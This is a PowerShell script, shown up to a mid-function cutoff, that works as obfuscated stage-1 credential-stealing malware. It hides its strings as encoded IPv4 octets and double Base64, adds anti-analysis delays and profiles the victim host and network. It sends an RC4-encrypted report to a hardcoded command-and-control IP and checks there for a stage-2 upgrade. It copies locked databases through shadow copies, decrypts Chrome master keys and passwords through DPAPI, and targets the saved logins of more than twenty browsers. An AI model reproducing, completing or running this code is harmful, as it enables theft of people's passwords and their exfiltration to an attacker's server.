param(
    [string]$xzvcv = $null,
    [string]$cxzvz = $null,
    [int]$vczxv = 0,
    [string]$zxcvx = $null
)

# =============================================
# UNIVERSAL DEOBFUSCATION HELPERS
# =============================================

function ConvertFrom-IPv4 {
    param([string[]]$IPs)
    $bytes = @()
    foreach ($ip in $IPs) {
        $octets = $ip.Split('.')
        $bytes += [byte]$octets[0], [byte]$octets[1], [byte]$octets[2], [byte]$octets[3]
    }
    return $bytes
}

function ConvertFrom-IPv6 {
    param([string[]]$IPv6s)
    $bytes = @()
    foreach ($ipv6 in $IPv6s) {
        $groups = $ipv6.Split(':')
        foreach ($group in $groups) {
            if ($group.Length -eq 4) {
                $byte1 = [Convert]::ToByte($group.Substring(0,2), 16)
                $byte2 = [Convert]::ToByte($group.Substring(2,2), 16)
                $bytes += $byte1, $byte2
            }
        }
    }
    return $bytes
}

function ConvertFrom-MAC {
    param([string[]]$MACs)
    $bytes = @()
    foreach ($mac in $MACs) {
        $octets = $mac.Split('-')
        foreach ($octet in $octets) {
            $bytes += [Convert]::ToByte($octet, 16)
        }
    }
    return $bytes
}

function ConvertFrom-UUID {
    param([string[]]$UUIDs)
    $bytes = @()
    foreach ($uuid in $UUIDs) {
        $cleanUuid = $uuid.Replace('-', '')
        for ($i = 0; $i -lt $cleanUuid.Length; $i += 2) {
            $bytes += [Convert]::ToByte($cleanUuid.Substring($i, 2), 16)
        }
    }
    return $bytes
}

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Initialize default parameter values if not provided
if (-not $xzvcv) { 
    $xzvcv = "http://45.153.127.81:8081"
}
if (-not $cxzvz) { 
    $cxzvz = [System.Guid]::NewGuid().ToString()
}
if ($vczxv -eq 0) { 
    $vczxv = 30
}
if (-not $zxcvx) { 
    $zxcvx = @("77.111.122.105", "108.108.97.47", "53.46.48.32", "40.87.105.110", "100.111.119.115", "32.78.84.32", "49.48.46.48", "59.32.87.105", "110.54.52.59", "32.120.54.52", "41.32.65.112", "112.108.101.87", "101.98.75.105", "116.47.53.51", "55.46.51.54", "0.0.0.0")
    $zxcvx = [Text.Encoding]::UTF8.GetString((ConvertFrom-IPv4 -IPs $zxcvx))
}

# =============================================
# ADVANCED OBFUSCATION AND EVASION
# =============================================

# Variable name randomization
$script:xzvcx = @{
    'LogData' = 'cvxzz'
    'WebData' = 'zvcxz'
    'CookieData' = 'xzczv'
    'PassData' = 'vczxc'
}

# Function name obfuscation using reflection
function xvczx {
    param([string]$czvxc, [object[]]$vxczx)
    $zxcvz = Get-Command $czvxc -ErrorAction SilentlyContinue
    if ($zxcvz) {
        return & $zxcvz @vxczx
    }
    return $null
}

# Dynamic type loading to avoid static analysis
function cxvzx {
    param([string]$zvcxz)
    $xczvc = [Type]::GetType($zvcxz)
    if (-not $xczvc) {
        $vczxc = [System.AppDomain]::CurrentDomain.GetAssemblies()
        foreach ($xzvcz in $vczxc) {
            $xczvc = $xzvcz.GetType($zvcxz)
            if ($xczvc) { break }
        }
    }
    return $xczvc
}

# Anti-analysis timing delays
function zxvcz {
    try {
        $cxzvx = @("71.101.116.45", "82.97.110.100", "111.109.0.0")
        $vxczx = ConvertFrom-IPv4 -IPs $cxzvx
        $zvcxz = [Text.Encoding]::UTF8.GetString($vxczx)
        $czvxc = & $zvcxz -Minimum 100 -Maximum 500
        
        $xzczv = @("83.116.97.114", "116.45.83.108", "101.101.112.0")
        $vczxc = ConvertFrom-IPv4 -IPs $xzczv
        $xzvcz = [Text.Encoding]::UTF8.GetString($vczxc)
        & $xzvcz -Milliseconds $czvxc
    } catch {
        # Fallback timing delay if Get-Random/Start-Sleep unavailable
        $fallbackDelay = [System.Random]::new().Next(100, 500)
        [System.Threading.Thread]::Sleep($fallbackDelay)
    }
}

# =============================================
# STRING OBFUSCATION FUNCTIONS
# =============================================

function vxczc {
    param([string]$xzvcz)
    try {
        zxvcz
        $cvxzz = [Convert]::FromBase64String($xzvcz)
        return [System.Text.Encoding]::UTF8.GetString($cvxzz)
    } catch {
        return $xzvcz
    }
}

function zvcxc {
    param([string[]]$xzczv)
    zxvcz
    return ($xzczv -join '')
}

# Heavily obfuscated string constants with multiple encoding layers
$script:zxccv = @{
    # Database and file names (IPv4 obfuscated)
    'LoginData' = @("76.111.103.105", "110.68.97.116", "97.0.0.0")
    'WebData' = @("87.101.98.68", "97.116.97.0")
    'Cookies' = @("67.111.111.107", "105.101.115.0")
    'NetworkCookies' = 'VG1WMGQyOXlhMXhEYjI5cmFXVnpJUT09'  # Double encoded
    'FormHistory' = 'Wm05eWJXaHBjM1J2Y25rdWMzRnNhWFJsUFE9PQ=='  # Double encoded
    'CookiesSqlite' = 'WTI5dmEybGxjeTVUY1d4cGRHVTlJUT09'  # Double encoded
    'LocalState' = 'VEc5allXd2dVM1JoZEdVOUlRPT0='  # Double encoded
    
    # SQL column names (obfuscated)
    'OriginUrl' = 'YjNKcFoybHVYM1Z5YkE9PQ=='
    'UsernameValue' = 'ZFhObGNtNWhiV1ZmZG1Gc2RXVTlJUT09'
    'PasswordValue' = 'Y0dGemMzZHZjbVJmZG1Gc2RXVTlJUT09'
    'EncryptedValue' = 'Wlc1amNubHdkR1ZrWDNaaGJIVmxQUT09'
    'HostKey' = 'YUc5emRGOXJaWGs5SVE9PQ=='
    'ExpiresUtc' = 'Wlhod2FYSmxjMTkxZEdNOUlRPT0='
    'NameOnCard' = 'Ym1GdFpWOXZibDlqWVhKa1BRUTU='
    'CardNumberEncrypted' = 'WTJGeVpGOXVkVzFpWlhKZlpXNWpjbmx3ZEdWa1BRUTU='
    
    # Process and system identifiers
    'PowershellExe' = 'Y0c5M1pYSnphR1ZzYkM1bGVHVTlJUT09'
    'Stage1Recon' = 'YzNSaFoyVXhMWEpsWTI5dUxuQnpNUT09'
    'WmiObject' = 'VjIxcFQySnFaV04wUFE9PQ=='
    'Win32Process' = 'VjJsdU16SkJjbTlqWlhOelBRPT0='
    
    # API endpoints and network
    'PsReport' = @("47.112.115.47", "114.101.112.111", "114.116.0.0")
    'PsUpgrade' = 'TDNCekwyVXdaM1Z6WkdWdVlRPT0='
    'Beacon' = 'TDJKbFlXTnZiZz09'
    'Result' = 'TDNKbGMzVnNkQT09'
    'ContentType' = 'WVhCd2JHbGpZWFJwYjI0dmFuTnZiZz09'
    'UserAgentHeader' = 'VlhObGNpMUJaMlZ1ZEE5SlFUMDk='
}

function czvxz {
    param([string]$xvczx)
    zxvcz
    if ($script:zxccv.ContainsKey($xvczx)) {
        $vxczx = $script:zxccv[$xvczx]
        if ($vxczx -is [array]) {
            # IPv4 deobfuscation
            $cxzvx = ConvertFrom-IPv4 -IPs $vxczx
            $decoded = [Text.Encoding]::UTF8.GetString($cxzvx)
            return $decoded.Trim([char]0)  # remove any trailing NULL bytes
        } else {
            # Legacy base64 decode
            $zvcxz = vxczc -xzvcz $vxczx
            $decoded = vxczc -xzvcz $zvcxz
            return $decoded.Trim([char]0)  # ensure clean string
        }
    }
    return $xvczx
}

# Dynamic assembly loading for crypto operations
function xzczc {
    $vczxv = @("83.121.115.116", "101.109.46.83", "101.99.117.114", "105.116.121.46", "67.114.121.112", "116.111.103.114", "97.112.104.121", "46.80.114.111", "116.101.99.116", "101.100.68.97", "116.97.0.0.0")
    $cxzvx = ConvertFrom-IPv4 -IPs $vczxv
    $zvcxz = [Text.Encoding]::UTF8.GetString($cxzvx)
    $xczvc = cxvzx -zvcxz $zvcxz
    return $xczvc
}

# Obfuscated WMI queries
function vczxz {
    param([string]$cxzvx, [string]$zvcxz = "root\cimv2")
    
    zxvcz
    $xzczv = @("83.121.115.116", "101.109.46.77", "97.110.97.103", "101.109.101.110", "116.46.77.97", "110.97.103.101", "109.101.110.116", "79.98.106.101", "99.116.83.101", "97.114.99.104", "101.114.0.0.0")
    $vczxc = ConvertFrom-IPv4 -IPs $xzczv
    $xzvcz = [Text.Encoding]::UTF8.GetString($vczxc)
    $cvxzz = cxvzx -zvcxz $xzvcz
    if ($cvxzz) {
        $zvcxc = New-Object $cvxzz($zvcxz, $cxzvx)
        return $zvcxc.Get()
    }
    return $null
}

# Dynamic path builders with randomized segments
function xvczc {
    param([string]$cxzvx, [string]$zvcxz = 'Default', [string]$xzczv)
    
    zxvcz
    $vczxc = @()
    
    switch ($cxzvx) {
        'Chrome' {
            $vczxc = @($env:LOCALAPPDATA, '\', 'Go', 'ogle\', 'Chr', 'ome\')
        }
        'Edge' {
            $vczxc = @($env:LOCALAPPDATA, '\', 'Mic', 'rosoft\', 'Ed', 'ge\')
        }
        'Brave' {
            $vczxc = @($env:LOCALAPPDATA, '\', 'Bra', 'veSoftware\', 'Bra', 've-Browser\')
        }
        'Firefox' {
            $vczxc = @($env:APPDATA, '\', 'Mo', 'zilla\', 'Fire', 'fox\')
        }
        'Opera' {
            $vczxc = @($env:APPDATA, '\', 'Op', 'era Software\', 'Op', 'era Stable\')
        }
        'Vivaldi' {
            $vczxc = @($env:LOCALAPPDATA, '\', 'Viv', 'aldi\')
        }
    }
    
    if ($vczxc.Count -gt 0) {
        $xzvcz = czvxz 'UserData'
        $cvxzz = zvcxc -xzczv $vczxc
        $zvcxc = zvcxc -xzczv @($cvxzz, $xzvcz)
        return zvcxc -xzczv @($zvcxc, '\', $zvcxz, '\', $xzczv)
    }
    return $null
}

# =============================================
# SINGLE INSTANCE ENFORCEMENT (OBFUSCATED)
# =============================================

function vxczv {
    Write-Log "Checking for previous Stage-1 instances..." "WARN"
    
    try {
        zxvcz
        $xzczv = $PID
        $vczxc = czvxz 'PowershellExe'
        $xzvcz = czvxz 'Stage1Recon'
        $cvxzz = @("83.69.76.69", "67.84.32.42", "32.70.82.79", "77.32.0.0")
        $zvcxc = ConvertFrom-IPv4 -IPs $cvxzz
        $cxzvx = [Text.Encoding]::UTF8.GetString($zvcxc)
        $zvcxz = $cxzvx + (czvxz 'Win32Process')
        $xczvc = vczxz -cxzvx $zvcxz | Where-Object { 
            $_.Name -eq $vczxc -and 
            $_.ProcessId -ne $xzczv -and 
            $_.CommandLine -like "*$xzvcz*"
        }
        
        foreach ($process in $processes) {
            Write-Log "Terminating previous Stage-1 instance (PID: $($process.ProcessId))" "WARN"
            Stop-Process -Id $process.ProcessId -Force -ErrorAction SilentlyContinue
        }
        
        # Also check for any hanging ZIP archives from previous runs
        $tempFiles = Get-ChildItem "$env:TEMP" -Filter "*_$($cxzvz.Substring(0,8))*.zip" -ErrorAction SilentlyContinue
        foreach ($file in $tempFiles) {
            Write-Log "Cleaning up previous archive: $($file.Name)"
            Remove-Item $file.FullName -Force -ErrorAction SilentlyContinue
        }
        
    } catch {
        Write-Log "Failed to check for previous instances: $_" "ERROR"
    }
}

# =============================================
# CORE C2 COMMUNICATION FUNCTIONS
# =============================================

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor $(if ($Level -eq "ERROR") { "Red" } elseif ($Level -eq "WARN") { "Yellow" } else { "Green" })
}

function Encrypt-RC4 {
    param([string]$Data, [string]$Key)
    try {
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
        $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
        
        # RC4 Key Scheduling Algorithm
        $S = 0..255
        $j = 0
        for ($i = 0; $i -lt 256; $i++) {
            $j = ($j + $S[$i] + $keyBytes[$i % $keyBytes.Length]) % 256
            $temp = $S[$i]
            $S[$i] = $S[$j]
            $S[$j] = $temp
        }
        
        # RC4 Pseudo-Random Generation Algorithm
        $i = 0
        $j = 0
        $encrypted = @()
        foreach ($byte in $dataBytes) {
            $i = ($i + 1) % 256
            $j = ($j + $S[$i]) % 256
            $temp = $S[$i]
            $S[$i] = $S[$j]
            $S[$j] = $temp
            $encrypted += $byte -bxor $S[($S[$i] + $S[$j]) % 256]
        }
        
        return [Convert]::ToBase64String($encrypted)
    } catch {
        Write-Log "RC4 encryption failed: $_" "ERROR"
        return $null
    }
}

function Send-ReportToC2 {
    param([hashtable]$ReportData)
    try {
        Write-Log "Preparing encrypted report for C2 server..."
        
        # Convert report to JSON
        $jsonReport = $ReportData | ConvertTo-Json -Depth 10 -Compress
        Write-Log "Report JSON length: $($jsonReport.Length) characters"
        
        # Encrypt using RC4 with Agent ID as key (padded to 16 chars if needed)
            $encryptionKey = if ($cxzvz.Length -ge 16) {
        $cxzvz.Substring(0, 16)
    } else {
        $cxzvz.PadRight(16, '0')
    }
        $encryptedData = Encrypt-RC4 -Data $jsonReport -Key $encryptionKey
        
        if (-not $encryptedData) {
            Write-Log "Failed to encrypt report data" "ERROR"
            return $false
        }
        
        # Prepare payload
        $payload = @{
            data = $encryptedData
        } | ConvertTo-Json -Compress
        
        Write-Log "Sending encrypted report to C2 server..."
        
        # Send to C2 server
        $headers = @{
            'Content-Type' = 'application/json'
            'User-Agent' = $zxcvx
            'X-Agent-ID' = $cxzvz
            'X-Encryption' = 'rc4'
        }
        
        $reportEndpoint = czvxz 'PsReport'
        $response = Invoke-RestMethod -Uri "$xzvcv$reportEndpoint" -Method POST -Body $payload -Headers $headers -TimeoutSec 30
        
        Write-Log "Report submitted successfully! Response: $($response.message)"
        
        # Check for upgrade approval
        if ($response.auto_upgrade -eq $true) {
            Write-Log "Auto-upgrade approved! Value score: $($response.value_score)" "WARN"
            return $true
        }
        
        Write-Log "Report processed. Value score: $($response.value_score), Auto-upgrade: $($response.auto_upgrade)"
        return $true
        
    } catch {
        Write-Log "Failed to send report to C2: $_" "ERROR"
        return $false
    }
}

function Check-UpgradeStatus {
    try {
        $upgradeEndpoint = czvxz 'PsUpgrade'
        $response = Invoke-RestMethod -Uri "$xzvcv$upgradeEndpoint/$cxzvz" -Method GET -Headers @{ 'User-Agent' = $zxcvx } -TimeoutSec 10
        
        if ($response.upgrade_approved -eq $true -and $response.current_stage -eq 2) {
            Write-Log "Upgrade to Stage 2 approved! Downloading..." "WARN"
            return $true
        }
        
        return $false
    } catch {
        Write-Log "Failed to check upgrade status: $_" "ERROR"
        return $false
    }
}

# =============================================
# SYSTEM RECONNAISSANCE FUNCTIONS
# =============================================

function Get-SystemProfile {
    Write-Log "Collecting system profile information..."
    
    try {
        zxvcz
        $osQuery = "SELECT * FROM Win32_OperatingSystem"
        $csQuery = "SELECT * FROM Win32_ComputerSystem"
        $os = vczxz -cxzvx $osQuery | Select-Object -First 1
        $cs = vczxz -cxzvx $csQuery | Select-Object -First 1
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object System.Security.Principal.WindowsPrincipal($user)
        $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
        
        # Get running processes
        $processes = Get-Process | Select-Object -ExpandProperty ProcessName | Sort-Object | Get-Unique
        
        # Check domain membership
        $isDomainJoined = $false
        try {
            zxvcz
            $domainQuery = "SELECT Domain FROM Win32_ComputerSystem"
            $domainResult = vczxz -cxzvx $domainQuery | Select-Object -First 1
            $isDomainJoined = $domainResult.Domain -notlike "*WORKGROUP*"
        } catch {}
        
        return @{
            hostname          = $env:COMPUTERNAME
            username          = $env:USERNAME
            os                = "$($os.Caption) $($os.Version)"
            architecture      = $env:PROCESSOR_ARCHITECTURE
            priv_level        = if ($isAdmin) { "Administrator" } else { "User" }
            ram_gb            = [int]([math]::Round($cs.TotalPhysicalMemory / 1GB))
            is_admin          = $isAdmin
            is_domain_joined  = $isDomainJoined
            running_processes = $processes
            ps_version        = $PSVersionTable.PSVersion.ToString()
        }
    } catch {
        Write-Log "Failed to collect system profile: $_" "ERROR"
        return @{}
    }
}

function Get-NetworkInfo {
    Write-Log "Collecting network information..."
    
    try {
        zxvcz
        $adapterQuery = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True"
        $adapters = vczxz -cxzvx $adapterQuery
        $networkType = "unknown"
        
        # Determine network type based on IP ranges
        foreach ($adapter in $adapters) {
            if ($adapter.IPAddress) {
                $ip = $adapter.IPAddress[0]
                if ($ip -like "10.*" -or $ip -like "172.*" -or $ip -like "192.168.*") {
                    $networkType = "corporate"
                    break
                }
                if ($ip -like "169.254.*") {
                    $networkType = "isolated"
                }
            }
        }
        
        return @{
            NetworkType = $networkType
            Adapters = $adapters | ForEach-Object {
                @{
                    Description = $_.Description
                    IPAddress = $_.IPAddress
                    MACAddress = $_.MACAddress
                }
            }
        }
    } catch {
        Write-Log "Failed to collect network info: $_" "ERROR"
        return @{}
    }
}

# =============================================
# SQLITE DATABASE FUNCTIONS
# =============================================

function Load-SQLiteAssembly {
    # Attempt to load a SQLite ADO.NET provider assembly. Try multiple fallbacks.
    param()

    $loaded = $false

    # 1. Try already installed assembly names
    foreach ($asmName in @('System.Data.SQLite', 'Microsoft.Data.Sqlite')) {
        try {
            [Reflection.Assembly]::Load($asmName) | Out-Null
            $loaded = $true
            break
        } catch {}
    }

    if (-not $loaded) {
        # 2. Look for DLLs in common locations (script dir and browser install dirs)
        $possibleDirs = @(
            $PSScriptRoot,
            "$env:LOCALAPPDATA\Google\Chrome\User Data",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
            "$env:LOCALAPPDATA\BraveSoftware",
            "$env:PROGRAMFILES\SQLite",
            "$env:PROGRAMFILES(x86)\SQLite",
            "$env:TEMP\sqlite"
        )

        foreach ($dir in $possibleDirs) {
            if (-not (Test-Path $dir)) { continue }
            
            $dllPath = "$dir\System.Data.SQLite.dll"
            if (Test-Path $dllPath) {
                try {
                    [Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
                    $loaded = $true
                    break
                } catch {}
            }
        }
    }

    if (-not $loaded) {
        # 3. Last resort: try to download a portable SQLite DLL
        try {
            $sqliteDir = "$env:TEMP\sqlite"
            $dllPath = "$sqliteDir\System.Data.SQLite.dll"
            
            if (-not (Test-Path $sqliteDir)) {
                New-Item -ItemType Directory -Path $sqliteDir -Force | Out-Null
            }
            
            if (-not (Test-Path $dllPath)) {
                # Download from a working SQLite source
                Write-Log "Attempting to download SQLite assembly..."
                
                $downloadUrl = "https://system.data.sqlite.org/downloads/1.0.119.0/sqlite-netFx46-binary-x64-2015-1.0.119.0.zip"
                $zipPath = "$sqliteDir\sqlite-tools.zip"
                
                try {
                    Write-Log "Downloading SQLite from: $downloadUrl"
                    $webClient = New-Object System.Net.WebClient
                    $webClient.DownloadFile($downloadUrl, $zipPath)
                    
                    # Extract the archive
                    Add-Type -AssemblyName System.IO.Compression.FileSystem
                    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $sqliteDir)
                    
                    # Look for the DLL in extracted content
                    $extractedDll = Get-ChildItem -Path $sqliteDir -Filter "System.Data.SQLite.dll" -Recurse | Select-Object -First 1
                    if ($extractedDll) {
                        Copy-Item $extractedDll.FullName $dllPath -Force
                        $downloaded = $true
                    } else {
                        Write-Log "System.Data.SQLite.dll not found in downloaded package" "WARN"
                    }
                    
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    
                } catch {
                    Write-Log "SQLite download failed: $_" "ERROR"
                }
            }
            
            if (Test-Path $dllPath) {
                [Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
                $loaded = $true
            }
        } catch {
            Write-Log "SQLite download failed: $_" "WARN"
        }
    }

    if ($loaded) {
        Write-Log "SQLite assembly loaded successfully"
        return $true
    } else {
        Write-Log "No SQLite assembly available - credential extraction will be limited" "WARN"
        return $false
    }
}

function Copy-LockedDatabase {
    param([string]$SourcePath, [string]$DestPath)
    
    try {
        # Try direct copy first
        Copy-Item -Path $SourcePath -Destination $DestPath -Force -ErrorAction Stop
        return $true
    } catch {
        try {
            # Use Volume Shadow Copy if direct copy fails
            $vssCommand = "vssadmin create shadow /for=$($SourcePath.Substring(0,2))"
            $vssOutput = cmd /c $vssCommand 2>&1
            
            if ($vssOutput -match "Shadow Copy ID: \{([^\}]+)\}") {
                $shadowID = $matches[1]
                $shadowPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy*\$($SourcePath.Substring(3))"
                Copy-Item -Path $shadowPath -Destination $DestPath -Force
                
                # Clean up shadow copy
                cmd /c "vssadmin delete shadows /Shadow={$shadowID} /Quiet" | Out-Null
                return $true
            }
        } catch {}
        
        Write-Log "Failed to copy locked database: $SourcePath" "ERROR"
        return $false
    }
}

function Query-SQLite {
    param([string]$DatabasePath, [string]$Query)
    
    # Check if SQLite was loaded at startup
    if (-not $script:sqliteAvailable) {
        Write-Log "SQLite not available - skipping database query" "ERROR"
        return @()
    }
    
    if (-not (Test-Path $DatabasePath)) {
        Write-Log "Database not found: $DatabasePath" "ERROR"
        return @()
    }
    
    # First attempt: Try read-only shared-cache connection with timeout
    try {
        $connectionString = "Data Source=$DatabasePath;Version=3;Read Only=True;Cache=Shared;Connection Timeout=5;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = $Query
        $command.CommandTimeout = 5  # 5 second timeout
        $reader = $command.ExecuteReader()
        
        $results = @()
        $rowCount = 0
        while ($reader.Read() -and $rowCount -lt 50) {  # Limit rows processed
            $row = @{}
            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                $row[$reader.GetName($i)] = $reader.GetValue($i)
            }
            $results += $row
            $rowCount++
        }
        
        $reader.Close()
        $connection.Close()
        
        Write-Log "SQLite query successful (direct access): $($results.Count) rows"
        return $results
        
    } catch {
        Write-Log "Direct SQLite access failed: $_ - Attempting VSS copy..." "WARN"
    }
    
    # Second attempt: Copy database to temp location using VSS if needed
    $tempDb = "$env:TEMP\temp_$(Get-Random).db"
    
    try {
        # Copy database to temp location (with VSS fallback)
        if (-not (Copy-LockedDatabase -SourcePath $DatabasePath -DestPath $tempDb)) {
            Write-Log "Failed to copy database for SQLite access: $DatabasePath" "ERROR"
            return @()
        }
        
        $connectionString = "Data Source=$tempDb;Version=3;Connection Timeout=5;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $command = $connection.CreateCommand()
        $command.CommandText = $Query
        $command.CommandTimeout = 5  # 5 second timeout
        $reader = $command.ExecuteReader()
        
        $results = @()
        $rowCount = 0
        while ($reader.Read() -and $rowCount -lt 50) {  # Limit rows processed
            $row = @{}
            for ($i = 0; $i -lt $reader.FieldCount; $i++) {
                $row[$reader.GetName($i)] = $reader.GetValue($i)
            }
            $results += $row
            $rowCount++
        }
        
        $reader.Close()
        $connection.Close()
        
        Write-Log "SQLite query successful (VSS copy): $($results.Count) rows"
        return $results
        
    } catch {
        Write-Log "SQLite query failed completely: $_" "ERROR"
        return @()
    } finally {
        if (Test-Path $tempDb) {
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
        }
    }
}

# =============================================
# ENCRYPTION/DECRYPTION FUNCTIONS
# =============================================

function Decrypt-DPAPIBlob {
    param([byte[]]$EncryptedData)
    
    try {
        zxvcz
        $cryptoProvider = Get-CryptoProvider
        if ($cryptoProvider) {
            $unprotectMethod = $cryptoProvider.GetMethod("Unprotect")
            $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            $decrypted = $unprotectMethod.Invoke($null, @($EncryptedData, $null, $scope))
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
        return $null
    } catch {
        return $null
    }
}

function Get-ChromeMasterKey {
    param([string]$LocalStatePath)
    
    try {
        if (-not (Test-Path $LocalStatePath)) {
            return $null
        }
        
        $localState = Get-Content $LocalStatePath | ConvertFrom-Json
        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
        
        # Remove "DPAPI" prefix
        $keyWithoutPrefix = $encryptedKey[5..($encryptedKey.Length-1)]
        
        # Decrypt using DPAPI
        return Decrypt-DPAPIBlob -EncryptedData $keyWithoutPrefix
        
    } catch {
        Write-Log "Failed to get Chrome master key: $_" "ERROR"
        return $null
    }
}

function Decrypt-AESGCMData {
    param([byte[]]$EncryptedData, [string]$Key)
    
    try {
        # Chrome AES-GCM decryption (simplified)
        # This is a basic implementation - full AES-GCM requires more complex crypto
        $nonce = $EncryptedData[3..14]
        $ciphertext = $EncryptedData[15..($EncryptedData.Length-17)]
        
        # For demonstration - in reality you'd need proper AES-GCM
        zxvcz
        $cryptoProvider = Get-CryptoProvider
        if ($cryptoProvider) {
            $unprotectMethod = $cryptoProvider.GetMethod("Unprotect")
            $scope = [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            return $unprotectMethod.Invoke($null, @($ciphertext, $nonce, $scope))
        }
        return $null
        
    } catch {
        return $null
    }
}

function Decrypt-ChromePassword {
    param([byte[]]$EncryptedPassword, [string]$MasterKey)
    
    if ($EncryptedPassword.Length -eq 0) {
        return ""
    }
    
    try {
        # Check if it's v10/v11 format (starts with "v10" or "v11")
        $prefix = [System.Text.Encoding]::UTF8.GetString($EncryptedPassword[0..2])
        
        if ($prefix -eq "v10" -or $prefix -eq "v11") {
            if ($MasterKey) {
                $decrypted = Decrypt-AESGCMData -EncryptedData $EncryptedPassword -Key $MasterKey
                if ($decrypted) {
                    return [System.Text.Encoding]::UTF8.GetString($decrypted)
                }
            }
        }
        
        # Fallback to DPAPI
        $decrypted = Decrypt-DPAPIBlob -EncryptedData $EncryptedPassword
        return if ($decrypted) { $decrypted } else { "" }
        
    } catch {
        return ""
    }
}

# =============================================
# CREDENTIAL EXTRACTION FUNCTIONS
# =============================================

function Get-BrowserPasswords {
    Write-Log "Extracting browser passwords..."
    
    $passwords = @()
    
    # Comprehensive Chromium-based browser paths (matching Go agent exactly)
    $chromiumBrowsers = @{
        "Chrome" = @(
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Login Data",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Login Data",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Login Data"
        )
        "Edge" = @(
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Login Data",
            "$env:LOCALAPPDATA\Microsoft\Edge Dev\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Microsoft\Edge Beta\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Microsoft\Edge Canary\User Data\Default\Login Data"
        )
        "Brave" = @(
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Login Data",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Beta\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser-Dev\User Data\Default\Login Data"
        )
        "Thorium" = @(
            "$env:LOCALAPPDATA\Thorium\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Thorium\User Data\Profile 1\Login Data",
            "C:\Program Files\Thorium\User Data\Default\Login Data",
            "C:\Program Files (x86)\Thorium\User Data\Default\Login Data"
        )
        "Opera" = @(
            "$env:APPDATA\Opera Software\Opera Stable\Login Data",
            "$env:APPDATA\Opera Software\Opera Beta\Login Data",
            "$env:APPDATA\Opera Software\Opera Developer\Login Data"
        )
        "Opera GX" = @(
            "$env:APPDATA\Opera Software\Opera GX Stable\Login Data",
            "$env:APPDATA\Opera Software\Opera GX Beta\Login Data"
        )
        "Vivaldi" = @(
            "$env:LOCALAPPDATA\Vivaldi\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 1\Login Data"
        )
        "Yandex" = @(
            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Profile 1\Login Data"
        )
        "UC Browser" = @(
            "$env:LOCALAPPDATA\UCBrowser\User Data\Default\Login Data"
        )
        "Chromium" = @(
            "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Chromium\User Data\Profile 1\Login Data"
        )
        "Cent Browser" = @(
            "$env:LOCALAPPDATA\CentBrowser\User Data\Default\Login Data"
        )
        "SRWare Iron" = @(
            "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data",
            "C:\Program Files\SRWare Iron\User Data\Default\Login Data",
            "C:\Program Files (x86)\SRWare Iron\User Data\Default\Login Data"
        )
        "Comodo Dragon" = @(
            "$env:LOCALAPPDATA\Comodo\Dragon\User Data\Default\Login Data"
        )
        "Torch Browser" = @(
            "$env:LOCALAPPDATA\Torch\User Data\Default\Login Data"
        )
        "Maxthon" = @(
            "$env:LOCALAPPDATA\Maxthon3\User Data\Default\Login Data",
            "$env:LOCALAPPDATA\Maxthon5\User Data\Default\Login Data"
        )
        "Slimjet" = @(
            "$env:LOCALAPPDATA\Slimjet\User Data\Default\Login Data"
        )
        "CocCoc" = @(
            "$env:LOCALAPPDATA\CocCoc\Browser\User Data\Default\Login Data"
        )
        "Avast Secure Browser" = @(
            "$env:LOCALAPPDATA\AVAST Software\Browser\User Data\Default\Login Data"
        )
        "AVG Secure Browser" = @(
            "$env:LOCALAPPDATA\AVG\Browser\User Data\Default\Login Data"
        )
        "360 Chrome" = @(
            "$env:LOCALAPPDATA\360Chrome\Chrome\User Data\Default\Login Data"
        )
        "QQBrowser" = @(
            "$env:LOCALAPPDATA\Tencent\QQBrowser\User Data\Default\Login Data"
        )
        "Sogou Explorer" = @(
            "$env:LOCALAPPDATA\Sogou\SogouExplorer\User Data\Default\Login Data"
        )
    }
    
    foreach ($browserName in $chromiumBrowsers.Keys) {
        $paths = $chromiumBrowsers[$browserName]
        
        foreach ($dbPath in $paths) {
